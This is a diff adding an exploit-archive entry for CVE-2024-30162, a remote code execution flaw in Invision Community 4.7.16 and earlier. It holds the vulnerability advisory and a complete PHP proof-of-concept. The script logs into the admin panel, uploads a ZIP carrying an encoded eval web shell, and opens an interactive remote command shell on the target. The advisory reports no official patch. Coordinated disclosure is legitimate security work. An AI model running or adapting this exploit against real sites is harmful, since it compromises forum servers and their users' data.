@@ -1,0 +1,181 @@
+id: 39538
+date: 04/08/2024
+title: Invision Community 4.7.16 Remote Code Execution Vulnerability
+author: EgiX
+cves: CVE-2024-30162
+
+------------------------------------------------------------------------------
+Invision Community <= 4.7.16 (toolbar.php) Remote Code Execution Vulnerability
+------------------------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://invisioncommunity.com
+
+
+[-] Affected Versions:
+
+Version 4.7.16 and prior versions.
+
+
+[-] Vulnerability Description:
+
+The vulnerability is located in the
+/applications/core/modules/admin/editor/toolbar.php script.
+Specifically, into the
+IPS\core\modules\admin\editor\_toolbar::addPlugin() method, which will
+handle
+the upload of a ZIP file, trying to extract its content into the
+/applications/core/interface/ckeditor/ckeditor/plugins/ directory; if
+the ZIP archive does not include
+a plugin.js file, then the extracted ZIP content will be recursively
+deleted from the file system,
+otherwise it will stay there. This can be exploited to execute
+arbitrary PHP code by uploading a
+ZIP archive containing a plugin.js file (which can also be empty)
+along with a PHP file. Successful
+exploitation of this vulnerability requires an Administrator account
+having the "toolbar_manage" permission.
+
+
+[-] Proof of Concept:
+
+https://karmainsecurity.com/pocs/CVE-2024-30162.php
+
+
+[-] Solution:
+
+No official solution is currently available.
+
+
+[-] Disclosure Timeline:
+
+[08/01/2024] - Vulnerability details sent to SSD Secure Disclosure
+[12/03/2024] - Version 4.7.16 released, but the issue is still not fixed
+[20/03/2024] - CVE identifier requested
+[24/03/2024] - CVE identifier assigned
+[05/04/2024] - Coordinated public disclosure
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2024-30162 to this vulnerability.
+
+
+[-] Credits:
+
+Vulnerability discovered by Egidio Romano.
+
+
+[-] Other References:
+
+https://ssd-disclosure.com/ssd-advisory-ip-board-nexus-rce-and-blind-sqli/
+
+
+[-] Original Advisory:
+
+http://karmainsecurity.com/KIS-2024-03
+
+
+-----------------------
+PoC:
+
+<?php
+
+/*
+    ------------------------------------------------------------------------------
+    Invision Community <= 4.7.16 (toolbar.php) Remote Code Execution Vulnerability
+    ------------------------------------------------------------------------------
+
+    author..............: Egidio Romano aka EgiX
+    mail................: n0b0d13s[at]gmail[dot]com
+    software link.......: https://invisioncommunity.com
+
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+
+    [-] Vulnerability Description:
+
+    The vulnerability is located in the /applications/core/modules/admin/editor/toolbar.php script.
+    Specifically, into the IPS\core\modules\admin\editor\_toolbar::addPlugin() method, which will
+    handle the upload of a ZIP file, trying to extract its content into the
+    /applications/core/interface/ckeditor/ckeditor/plugins/ directory; if the ZIP archive does
+    not include a plugin.js file, then the extracted ZIP content will be recursively deleted
+    from the file system, otherwise it will stay there. This can be exploited to execute
+    arbitrary PHP code by uploading a ZIP archive containing a plugin.js file (which can
+    also be empty) along with a PHP file. Successful exploitation of this vulnerability
+    requires an Administrator account having the "toolbar_manage" permission.
+
+    [-] Original Advisory:
+
+    https://karmainsecurity.com/KIS-2024-03
+*/
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+if (!extension_loaded("curl")) die("[-] cURL extension required!\n");
+
+if ($argc != 4) die("\nUsage: php $argv[0] <URL> <Email> <Password>\n\n");
+
+$url = $argv[1];
+$email = $argv[2];
+$passwd = $argv[3];
+$ch = curl_init();
+
+@unlink('./cookies.txt');
+
+curl_setopt($ch, CURLOPT_HEADER, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_COOKIEJAR, './cookies.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, './cookies.txt');
+
+print "[+] Logging into AdminCP\n";
+
+curl_setopt($ch, CURLOPT_URL, "{$url}admin/?app=core&module=system&controller=login");
+curl_setopt($ch, CURLOPT_POST, false);
+
+if (!preg_match('/csrfKey: "([^"]+)"/i', curl_exec($ch), $csrf)) die("[-] CSRF token not found!\n");
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, "csrfKey={$csrf[1]}&auth=".urlencode($email)."&password={$passwd}&_processLogin=usernamepassword");
+
+if (!preg_match("/303 See Other/i", curl_exec($ch))) die("[-] Login failed!\n");
+
+print "[+] Uploading malicious ZIP file\n";
+
+curl_setopt($ch, CURLOPT_URL, "{$url}admin/?app=core&module=editor&controller=toolbar&do=addPlugin");
+curl_setopt($ch, CURLOPT_POST, false);
+
+if (!preg_match('/csrfKey: "([^"]+)"/i', curl_exec($ch), $csrf)) die("[-] CSRF token not found!\n");
+
+$plg = md5(time()).".zip";
+
+@file_put_contents("rce.zip", base64_decode("UEsDBAoDAAAAADxvKFgecSjnMgAAADIAAAAJAAAAaW5kZXgucGhwPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VSVkVSWydIVFRQX0MnXSkpOyA/PgpQSwMECgMAAAAAQG8oWAAAAAAAAAAAAAAAAAkAAABwbHVnaW4uanNQSwECPwMKAwAAAAA8byhYHnEo5zIAAAAyAAAACQAkAAAAAAAAACCAtIEAAAAAaW5kZXgucGhwCgAgAAAAAAABABgAgMvlSzJC2gGAy+VLMkLaAYDL5UsyQtoBUEsBAj8DCgMAAAAAQG8oWAAAAAAAAAAAAAAAAAkAJAAAAAAAAAAggLSBWQAAAHBsdWdpbi5qcwoAIAAAAAAAAQAYAAC84E4yQtoBALzgTjJC2gEAvOBOMkLaAVBLBQYAAAAAAgACALYAAACAAAAAAAA="));
+
+$params = ["csrfKey" => $csrf[1], "form_submitted" => 1, "editor_plugin_zip_noscript[]" => new CURLFile("rce.zip", "", $plg)];
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+
+if (!preg_match("/301 Moved Permanently/i", curl_exec($ch))) die("[-] Upload failed!\n");
+
+print "[+] Launching shell\n";
+
+curl_setopt($ch, CURLOPT_URL, "{$url}applications/core/interface/ckeditor/ckeditor/plugins/{$plg}/");
+curl_setopt($ch, CURLOPT_POST, false);
+
+$phpcode = "print '____'; passthru(base64_decode('%s')); print '____';";
+
+while(1)
+{
+  print "\ninvision-shell# ";
+  if (($cmd = trim(fgets(STDIN))) == "exit") break;
+  curl_setopt($ch, CURLOPT_HTTPHEADER, ["C: ".base64_encode(sprintf($phpcode, base64_encode($cmd)))]);
+  preg_match('/____(.*)____/s', curl_exec($ch), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+#  0day.today [2024-04-10]  #
